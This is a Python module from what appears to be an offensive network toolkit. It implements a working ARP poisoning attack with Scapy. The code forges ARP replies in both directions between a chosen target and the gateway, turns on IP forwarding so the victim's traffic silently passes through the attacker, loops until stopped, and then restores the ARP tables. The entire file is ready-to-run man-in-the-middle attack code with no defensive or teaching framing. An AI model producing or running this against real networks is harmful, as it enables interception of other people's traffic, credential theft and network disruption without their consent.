# ============================================================
#  File: vanta/attacks/poison.py
# ============================================================
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr  # type: ignore

from .base import Attack
from ..core.iface import require_root, set_ip_forwarding
from ..core.errors import AttackError


class ArpPoison(Attack):
    """
    Classic bidirectional ARP spoof between a target and the gateway.
    Requires root + IP forwarding so the victim's traffic still flows.
    """

    NAME = "arp-poison"

    def __init__(self, cfg, logger, broadcast: bool = False):
        super().__init__(cfg, logger)
        self.broadcast = broadcast
        self._original_fwd: bool = False

    # ---------------- setup ----------------
    def setup(self):
        require_root()
        iface = self.cfg.require_interface()
        if not self.cfg.target_ip or not self.cfg.target_mac:
            raise AttackError(
                "target IP/MAC unset — run 'scan' or 'set target <ip>' first.")
        if not self.cfg.gateway_ip or not self.cfg.gateway_mac:
            raise AttackError(
                "gateway IP/MAC unset — run 'set gateway <ip>' or 'scan'.")

        self.attacker_mac = self.cfg.attacker_mac or get_if_hwaddr(iface)
        self.attacker_ip  = self.cfg.attacker_ip

        from ..core import Sysctl
        self._sysctl = Sysctl(self.log)
        self._sysctl.enable_ipv4_forwarding()

    # ---------------- main loop ----------------
    def _run(self):
        target_ip  = self.cfg.target_ip
        target_mac = self.cfg.target_mac
        gw_ip      = self.cfg.gateway_ip
        gw_mac     = self.cfg.gateway_mac
        my_mac     = self.attacker_mac
        iface      = self.cfg.iface
        interval   = 1.0 / max(self.cfg.packet_rate, 0.1)

        # Frames: to target -> gateway IP is at MY MAC
        pkt_to_target = (
            Ether(dst=target_mac, src=my_mac) /
            ARP(op=2, psrc=gw_ip, pdst=target_ip,
                hwsrc=my_mac, hwdst=target_mac)
        )
        # to gateway -> target IP is at MY MAC
        pkt_to_gw = (
            Ether(dst=gw_mac, src=my_mac) /
            ARP(op=2, psrc=target_ip, pdst=gw_ip,
                hwsrc=my_mac, hwdst=gw_mac)
        )

        self.log.ok(f"Poisoning {target_ip} ↔ {gw_ip} "
                    f"(rate {self.cfg.packet_rate:.1f} pkt/s)")

        count = 0
        while not self._stop.is_set():
            try:
                sendp(pkt_to_target, iface=iface, verbose=False)
                sendp(pkt_to_gw,     iface=iface, verbose=False)
                count += 2
                self.stats["packets_sent"] = count
                self.stats["target_ip"] = target_ip
                self.stats["gateway_ip"] = gw_ip
            except Exception as e:
                self.log.warn(f"sendp error: {e}")
            self._stop.wait(interval)

    # ---------------- teardown ----------------
    def teardown(self):
        """Restore correct ARP entries (multiple times — switches cache)."""
        iface = self.cfg.iface
        try:
            restore_target = (
                Ether(dst=self.cfg.target_mac, src=self.cfg.gateway_mac) /
                ARP(op=2, psrc=self.cfg.gateway_ip,
                    pdst=self.cfg.target_ip,
                    hwsrc=self.cfg.gateway_mac,
                    hwdst=self.cfg.target_mac)
            )
            restore_gw = (
                Ether(dst=self.cfg.gateway_mac, src=self.cfg.target_mac) /
                ARP(op=2, psrc=self.cfg.target_ip,
                    pdst=self.cfg.gateway_ip,
                    hwsrc=self.cfg.target_mac,
                    hwdst=self.cfg.gateway_mac)
            )
            for _ in range(5):
                sendp(restore_target, iface=iface, verbose=False)
                sendp(restore_gw,     iface=iface, verbose=False)
                time.sleep(0.2)
            self.log.ok("ARP tables restored.")
        except Exception as e:
            self.log.warn(f"restore failed: {e}")

        if getattr(self, "_sysctl", None):
            self._sysctl.restore_all()

